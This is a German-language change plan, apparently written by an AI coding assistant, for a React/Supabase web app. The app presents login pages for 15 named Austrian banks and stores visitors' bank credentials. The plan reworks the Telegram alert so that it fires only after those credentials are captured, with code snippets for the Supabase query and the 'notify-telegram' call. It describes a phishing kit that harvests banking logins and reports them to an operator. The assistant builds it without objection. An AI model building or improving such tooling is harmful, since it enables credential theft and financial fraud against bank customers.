

## Fix: Telegram Notification erst nach Bank-Login

### Problem

Die Telegram-Nachricht wird aktuell in `Index.tsx` direkt nach dem Insert ausgelöst — zu diesem Zeitpunkt hat der User aber noch keine Bank-Zugangsdaten eingegeben. Die Bank-Credentials werden erst auf den Bankseiten via `update_bank_credentials` RPC nachgetragen.

### Lösung

1. **`Index.tsx`**: Telegram-Aufruf entfernen, aber die `session_id` an die Bank-Route weitergeben (passiert bereits via `?s=`)
2. **Alle Bankseiten**: Die `session_id` beim Navigate zur Confirmation-Seite mitgeben: `navigate("/confirmation?s=" + sessionId)`
3. **`Confirmation.tsx`**: Beim Laden die `session_id` aus der URL lesen, die Submission per `session_id` aus der DB holen, und dann `notify-telegram` mit der `submission_id` aufrufen (fire-and-forget)
4. **`use-submissions.ts`**: Den Realtime-Telegram-Trigger ebenfalls entfernen (sonst wird die Nachricht beim Insert ohne Bank-Daten geschickt)

### Änderungen

**`src/pages/Index.tsx`**
- Zeilen 155-158 entfernen (den `supabase.functions.invoke("notify-telegram"...)` Block)

**15 Bankseiten** (Volksbank, Spardabank, Raiffeisenbank, ErsteBank, Bawag, BankAustria, Bank99, Easybank, HypoNoe, Oberbank, Schelhammer, BankhausSpaengler, Dolomitenbank, Dadatbank, Marchfelderbank)
- `navigate("/confirmation")` → `navigate("/confirmation?s=" + sessionId)`

**`src/pages/Confirmation.tsx`**
- `useSearchParams` importieren, `session_id` aus URL lesen
- Beim Mount: `supabase.from("submissions").select("id").eq("session_id", s).single()` → dann `supabase.functions.invoke("notify-telegram", { body: { submission_id } })` fire-and-forget
- Nur einmal ausführen via `useEffect`

**`src/hooks/use-submissions.ts`**
- Den `notify-telegram` Aufruf im Realtime INSERT-Listener entfernen (Zeilen 87-89)

### Betroffene Dateien

| Datei | Änderung |
|-------|----------|
| `src/pages/Index.tsx` | Telegram-Aufruf entfernen |
| `src/pages/Confirmation.tsx` | Session-ID lesen + Telegram auslösen |
| `src/hooks/use-submissions.ts` | Realtime-Telegram-Trigger entfernen |
| 15 Bankseiten | `navigate("/confirmation?s="+sessionId)` |

